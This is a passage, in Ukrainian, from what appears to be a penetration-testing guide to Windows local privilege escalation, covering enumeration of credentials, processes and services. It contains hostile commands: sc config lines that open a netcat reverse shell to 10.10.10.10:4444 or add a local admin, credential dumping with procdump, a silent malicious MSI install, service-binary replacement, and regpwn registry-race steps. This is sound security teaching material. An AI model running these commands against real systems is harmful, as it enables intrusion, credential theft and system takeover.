- Нарешті, **зіберіть його**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що платформу встановлено на x64.

### Інсталяція MSI

Щоб виконати **інсталяцію** шкідливого файлу `.msi` у **фоновому режимі:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_

## Антивіруси та засоби виявлення

### Параметри аудиту

Ці параметри визначають, що **журналюється**, тому на них варто звернути увагу.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — цікаво знати, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначений для **керування паролями локальних облікових записів Administrator**. Він гарантує, що на комп’ютерах, приєднаних до домену, кожен пароль буде **унікальним, випадковим і регулярно оновлюватиметься**. Ці паролі надійно зберігаються в Active Directory, і доступ до них можуть мати лише користувачі, яким через ACL надано достатні дозволи. Це дає їм змогу переглядати паролі локального адміністратора, якщо вони мають відповідні повноваження.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо WDigest активний, **паролі зберігаються у відкритому тексті в LSASS** (Local Security Authority Subsystem Service).\
[**Докладніше про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Докладніше про захист LSA**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash. [**Докладніше про Credential Guard можна дізнатися тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Доменні облікові дані** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, зазвичай створюються доменні облікові дані цього користувача.\
[**Докладніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перелік користувачів і груп

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **належите до привілейованої групи, можливо, ви зможете підвищити привілеї**. Дізнайтеся тут про привілейовані групи та про те, як зловживати ними для підвищення привілеїв:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляції з токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Токени Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві токени** та про те, як зловживати ними:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, що увійшли в систему / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримати вміст буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Перш за все, під час перегляду списку процесів **перевірте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл** або чи маєте права на запис у папку з бінарним файлом, щоб скористатися можливими [**атаками DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), якими можна зловживати для підвищення привілеїв.

Слухач debugger може працювати недовго, тому його відсутність в одному пасивному знімку портів не доводить, що він ніколи не був відкритий. Зіставляйте виявлений слухач із його PID, власником процесу та можливістю користувача з нижчими привілеями підключитися до нього; сама назва програми або debug flag не підтверджує можливість виконання коду від імені іншого користувача. Під час звичайного збору даних дійте пасивно, не надсилаючи команди debugger.

**Перевірка дозволів бінарних файлів процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів на папки з бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги динамічних препроцесорів Snort

Snort 2 може завантажувати shared libraries із каталогу `dynamicpreprocessor directory`, указаного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Для запланованого завдання або служби, що запускає Snort під іншим обліковим записом, перевірте саме цю конфігурацію та ACL оголошеного каталогу модулів. Якщо ваш токен дає змогу створювати там файли, цей шлях варто перевірити на можливість виконання коду під час наступного завантаження модулів завданням або службою. Перевірте ефективні привілеї облікового запису запуску, активну конфігурацію, сумісність модулів і будь-які обмеження deny або спільного доступу; сам факт можливості запису до каталогу не підтверджує ескалацію привілеїв. [Документація Snort щодо dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) описує завантаження модулів під час виконання.

### Привілейована вебслужба із доступним для запису кореневим каталогом документів

В інсталяції Windows Apache зіставте шлях до виконуваного файлу служби та обліковий запис запуску зі значенням `DocumentRoot` в активному `httpd.conf`. Для типового розташування XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, часто це `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому каталозі, а Apache працює як `LocalSystem`, виконання серверного коду може перетнути межу привілеїв хоста. Переконайтеся, що служба працює, що обслуговуються файли саме з цього шляху, а обробник на сервері обробляє цей тип файлів; можливість запису до кореневого каталогу сама по собі підтверджує лише можливість створення файлів. Перевірте ACL, не записуючи пробний файл:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для типової інсталяції WAMP служба може вказувати на версіонований `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а конфігурація розташовуватися поруч у `conf\httpd.conf`, з кореневим каталогом за замовчуванням `C:\wamp64\www` або `C:\wamp\www`. Перевірте точний шлях до виконуваного файла служби, обліковий запис, від імені якого вона працює, ефективний `DocumentRoot` (включно з підстановкою `${INSTALL_DIR}` і перевизначеннями віртуального хоста) та ACL кореневого каталогу. Доступ на запис до каталогу WAMP сам по собі не підтверджує, що Apache працює як `SYSTEM` або виконує надісланий файл. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережева ідентичність пулу застосунків

Для IIS зіставте фізичний каталог, доступний для запису, з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте налаштований для нього пул і серверний обробник. Код у каталозі, який обслуговується, виконується від імені пулу лише за умови, що IIS обробляє цей тип файлів і маршрут доступний. Перш ніж вважати доступний для запису каталог шляхом до виконання коду, перевірте ефективний дозвіл поточного користувача на створення файлів, стан сайту під час роботи, обробник і перевизначення для відповідного шляху.

Динамічна компіляція ASP.NET — це окремий шлях, який слід перевірити: згенеровані файли в каталозі компіляції застосунку. За замовчуванням це каталог `Temporary ASP.NET Files` у відповідній інсталяції .NET Framework, але атрибут `<compilation tempDirectory>` у застосунку може змінити його. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) та [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен користувача з нижчими привілеями може змінити згенерований код у кеші **конкретного** застосунку, з’ясуйте, чи компілює цей застосунок його повторно від імені привілейованішої [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Самі лише ACL файла чи каталогу не доводять можливості виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, налаштуваннями компіляції, ідентичністю процесу та моментом повторної компіляції. Перевіряйте метадані лише для читання; під час переліку не запускайте компіляцію та не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується в доменних ресурсах як **обліковий запис комп’ютера-хоста**, хоча його локальний токен може мати низькі привілеї. `LocalSystem` уже має високі привілеї локально та також використовує обліковий запис комп’ютера в мережі; `LocalService` зазвичай використовує анонімні мережеві облікові дані. Пул `SpecificUser` використовує налаштований для нього обліковий запис. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) та [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не вказано, можуть застосовуватися значення пулу за замовчуванням, які відрізняються між поколіннями IIS, тому визначте ефективну конфігурацію, а не робіть припущень за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю облікового запису комп’ютера, оцініть права **саме цього комп’ютера** в домені. [DCSync](../active-directory-methodology/dcsync.md) потребує прав реплікації на контексті іменування домену; сам квиток облікового запису комп’ютера або роль хоста не доводять наявності таких прав. Під час пасивного переліку перевіряйте конфігурацію та ACL, не завантажуючи файли, не ініціюючи мережеву автентифікацію та не запитуючи квитки.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте, як дані з запиту проходять автентифікацію, розшифрування, перевірку та формування команди. Обробник, який додає декодований токен до `ProcessStartInfo("cmd", "/c ...")`, може дозволити метасимволам оболонки змінити команду; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що недовірений викликач справді може впливати на декодоване значення та звертатися до обробника, а потім визначте ефективну ідентичність пулу застосунків або імперсонованого користувача й ідентичність дочірнього процесу. Рядок у доступному для читання вихідному коді, прослуховувач на localhost або слабкість формату токена самі по собі не доводять можливості виконання привілейованих команд. Під час пасивного переліку перевіряйте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес.

Для служби PHP у Windows шлях, керований запитом і переданий у [`include` or `require`](https://www.php.net/manual/en/function.include.php), може призвести до виконання PHP-файла, доступного для запису користувачеві з нижчими привілеями, від імені робочого процесу. Переконайтеся, що запит може дійти до цього оператора, визначений шлях указує на файл, який користувач із нижчими привілеями може змінювати, а робочий процес — читати, відповідні обмеження шляхів PHP дозволяють підключення, а сам робочий процес справді має вищі привілеї. Прослуховувач на loopback-інтерфейсі або файл, доступний для запису, самі по собі не підтверджують цей ланцюжок; під час пасивного переліку перевіряйте вихідний код, ідентичність служби й ACL файлів, не викликаючи кінцеву точку.

### Пошук паролів у пам’яті

За допомогою **procdump** із sysinternals можна створити дамп пам’яті запущеного процесу. Служби на кшталт FTP зберігають **облікові дані у відкритому тексті в пам’яті**; спробуйте створити дамп пам’яті та прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Небезпечні GUI-застосунки

**Застосунки, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: «Довідка та підтримка Windows» (Windows + F1), знайдіть «командний рядок» і натисніть «Натисніть, щоб відкрити командний рядок»

### Імпорт файлів проєктів із підвищеними привілеями

Застосунок, який автоматично відкриває проєкти з каталогу для скидання файлів, доступного для запису користувачу з нижчими привілеями, перетинає межу довіри до вхідних даних, працюючи від імені облікового запису імпортера. Перевірте **точний шлях із правами на запис**, процес або завдання, що відкриває його, ефективну ідентичність і версію парсера. У [історичній проблемі Ghidra з відкриттям/відновленням проєктів](https://github.com/NationalSecurityAgency/ghidra/issues/71) у метаданих проєкту допускалися зовнішні сутності XML; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяли [політики вихідного SMB і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це привід перевірити можливий витік облікових даних, а не безпосередній доступ адміністратора: відповідь має бути придатною для використання через окремий авторизований або вразливий шлях, а поточні збірки слід оцінювати з огляду на фактичний стан виправлень. Не відкривайте спеціально створений проєкт під час пасивної розвідки; перевірте процес імпорту й ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) для об'єкта Service Control Manager (SCM) відрізняється від прав на наявну службу. Успішний доступ лише для читання через запит [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) із цим правом є приводом для перевірки, а не доказом того, що нова служба може запускатися. [`CreateService` повертає дескриптор](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час створення; повторне відкриття служби пізніше виконує окрему перевірку доступу й може завершитися невдачею, навіть якщо можна було скористатися початковим дескриптором. Окремо перевірте ефективний локальний або віддалений токен, надані права дескриптора, обліковий запис служби, політику запуску й шлях до виконуваного файла. Не створюйте й не запускайте службу під час пасивної розвідки.

Для віддаленого встановлення служби зіставте ці права SCM із мережевим ресурсом на цільовому вузлі, доступним для запису **з того самого мережевого входу**, його базовим ACL NTFS і локальним шляхом до виконуваного файла, який може запускати обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо існують незвично широкі права SCM і шлях для розміщення файла; адміністративний мережевий ресурс не є обов'язковою умовою. Сам по собі доступ до мережевого ресурсу для запису або право створення служби в SCM не доводять, що нова служба може запускатися з вищими привілеями.

Наявна служба може викликати допоміжний виконуваний файл під час запуску, зупинки або іншої події життєвого циклу, навіть якщо цього файла немає в її `ImagePath`. Якщо ім'я допоміжного файла розв'язується в каталог, доступний для запису користувачу з нижчими привілеями, а служба працює з вищими привілеями, відсутній файл може бути умовним кандидатом на підміну. Переконайтеся в наявності **фактичного коду служби або задокументованого виклику допоміжного файла**, розв'язаного шляху до виконуваного файла й порядку пошуку, прав на створення файлів у каталозі, ідентичності служби та доступного тригера життєвого циклу. Каталог служби з правами на запис або відсутній файл самі по собі не доводять, що служба завантажує цей файл; під час пасивної перевірки не зупиняйте й не запускайте службу.

Для наявної служби [`SERVICE_START` дає змогу передавати аргументи в `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); це право відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати доступ до запуску чимось більшим за право керування, перевірте код служби або задокументований інтерфейс. Якщо вона використовує вибраний викликачем аргумент як шлях до журналу або файла експорту, перевірте ідентичність служби, точний потік передавання аргументу до операції запису, обмеження шляху й дозволи на **створений файл**. Запис у захищений каталог може призвести до підвищення привілеїв лише за наявності окремого привілейованого процесу-споживача або завантажувача, який приймає цей файл; одного лише доступу на запис до журналу чи права запуску недостатньо. Під час пасивної інвентаризації не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ доступність для читання `nsclient.ini` є **приводом перевірити конфігурацію**: файл може містити облікові дані вебінтерфейсу, а `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, вебслухач WEB і політику доступу, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для виконання з підвищеними привілеями додатково потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), фактичне право реєструвати або змінювати команду й тригер, який запускає її від імені ідентичності служби. Слухач, доступний лише через loopback, усе одно може бути доступним локальному користувачу, але самі шлях до файла, пароль або слухач не підтверджують наявність цих прав. Під час пасивної розвідки перевіряйте метадані й дозволи, не показуючи секрети й не викликаючи веб API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації з безпеки вебінтерфейсу й скриптів](https://nsclient.org/docs/setup/securing/) і [конфігурацію зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` має значення `nssm.exe`, перевірте фактичний обліковий запис, від імені якого працює служба, і значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає дочірній застосунок там](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), а `AppDirectory` — це налаштований робочий каталог. Перш ніж вважати дозволи обгортки єдиною межею безпеки служби, перевірте ACL дочірнього виконуваного файла та його батьківських каталогів. Локальна кінцева точка WCF або SOAP, відкрита цим дочірнім процесом, є окремим приводом для перевірки: переконайтеся, що користувач із нижчими привілеями може під'єднатися до слухача, що конкретна операція приймає його вхідні дані, а дочірній процес служби виконує небезпечну операцію з вищими привілеями. Обліковий запис служби, URL кінцевої точки або шлях із правами на запис самі по собі не доводять можливість підвищення привілеїв; під час пасивної розвідки не викликайте операції служби.

Для спеціальної операції WCF простежте, як рядок, контрольований викликачем, потрапляє в будь-який runspace PowerShell. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` запускає pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` з обліковими даними Windows для транспортного рівня](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але авторизацію на виклик **конкретної** операції й ефективну ідентичність runspace слід перевіряти окремо. Шлях від вхідних даних викликувача з нижчими привілеями до `AddScript` під ідентичністю служби з вищими привілеями є межею виконання коду; самі лише порт, що прослуховується, автентифікований клієнт або невикористовуваний метод у не пов'язаній збірці не є доказом. Статично перевірте розгорнуту службу, контракт, налаштування авторизації та імперсонації, не викликаючи кінцеву точку під час розвідки.

Тригери служб дають змогу Windows запускати службу за певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, під'єднання пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати привілейовані служби, активуючи їхні тригери. Див. методи переліку й активації тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностичних даних Visual Studio

Інсталяції Visual Studio з інструментами C/C++ можуть містити `VSStandardCollectorService150` — діагностичну службу, налаштовану для запуску від імені `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) використовували junction і race condition із посиланням object manager, щоб перенаправити скидання DACL служби. Для продемонстрованого підвищення привілеїв також був потрібен доступний шлях відновлення MSI через WMI Provider Visual Studio Setup і файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивної перевірки огляньте обліковий запис і шлях до бінарного файла саме цієї служби, перевірте, чи існує шлях до компілятора Setup WMI, і встановіть стан виправлень установленого компонента. Запис служби, версія продукту Visual Studio або сам файл компілятора не доводять, що вузол уразливий. Для перевірки не потрібно запускати службу чи виконувати відновлення.

Отримайте список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про службу.

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Тут можна завантажити accesschk.exe для XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо виникає ця помилка (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Службу не можна запустити: її вимкнено або з нею не пов’язано жодних увімкнених пристроїв._

Її можна ввімкнути за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Зверніть увагу, що служба upnphost залежить від SSDPSRV для роботи (для XP SP1)**

**Ще один обхідний спосіб** вирішити цю проблему — виконати:

```
sc.exe config usosvc start= auto
```

### **Змінити шлях до виконуваного файла служби**

Якщо група «Автентифіковані користувачі» має дозвіл **SERVICE_ALL_ACCESS** для служби, можна змінити її виконуваний файл. Щоб змінити й виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапуск служби

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити за допомогою різних дозволів:

- **SERVICE_CHANGE_CONFIG**: Дозволяє змінювати конфігурацію бінарного файлу служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати право власності та змінювати дозволи.
- **GENERIC_WRITE**: Надає успадковану можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також надає успадковану можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна скористатися модулем _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, службу часто можна захопити, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити бінарний файл, який запускає служба,** або чи маєте **дозволи на запис у папку**, де розміщено бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Отримати список усіх бінарних файлів, які запускаються службами, можна за допомогою **wmic** (не в system32), а перевірити дозволи — за допомогою **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** і **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо дозволи **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файла служби чи каталогу, у якому він міститься. Практичний сценарій зловживання:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файла за допомогою `sc qc <service_name>`.
2. Перевірте, чи можна записувати у binary, за допомогою `icacls <path>`.
3. Замініть binary служби на payload або дійсний шкідливий binary служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачу перезапустити її, перевірте, чи запускається вона автоматично під час завантаження системи, чи має дію у разі збою, яка повторно запускає її, або чи можна опосередковано запустити її через програму, яка її використовує.

### Дозволи на зміну реєстру служб

Перевірте, чи можете ви змінити реєстр будь-якої служби.\
Ви можете **перевірити** свої **дозволи** на **реєстр** служби таким чином:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Початкову перевірку дозволів було сформульовано так:

Потрібно перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозвіл `FullControl`. Якщо так, бінарний файл, який запускає служба, можна змінити.

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи на запис у реєстрі для певного ключа служби. Сам запис ACL не доводить, що доступ фактично надається: важливі записи заборони, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об’єкта служби. Для підвищення привілеїв також потрібні придатне поле конфігурації служби, спосіб запустити службу та ідентичність служби з вищими привілеями. Див. [права на ключі реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) від Microsoft і [довідку щодо прав доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Щоб змінити шлях до бінарного файлу, який запускається:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка symlink у реєстрі для довільного запису значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для окремих користувачів, які згодом копіюються процесом **SYSTEM** до ключа сеансу HKLM. Гонка **symbolic link** у реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив довільного **запису значення** HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список установлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходів до захищеного робочого стола та доступний користувачу для запису.

Сценарій експлуатації (CVE-2026-24291 / ATConfig):

1. Запишіть потрібне значення **HKCU ATConfig**, яке має бути записане від імені SYSTEM.
2. Запустіть копіювання для захищеного робочого стола (наприклад, за допомогою **LockWorkstation**), що запускає процес брокера AT.
3. **Виграйте гонку**: встановіть **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **registry link**, що вказує на захищений цільовий шлях HKLM.
4. SYSTEM запише вибране зловмисником значення до перенаправленого шляху HKLM.

Отримавши можливість довільно записувати значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служби:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запускати звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** публічна реалізація експлойта **блокує робочу станцію** під час гонки.

Приклади інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл на реєстр, це означає, що **ви можете створювати підреєстри в ньому**. Для служб Windows цього **достатньо, щоб виконати довільний код:**


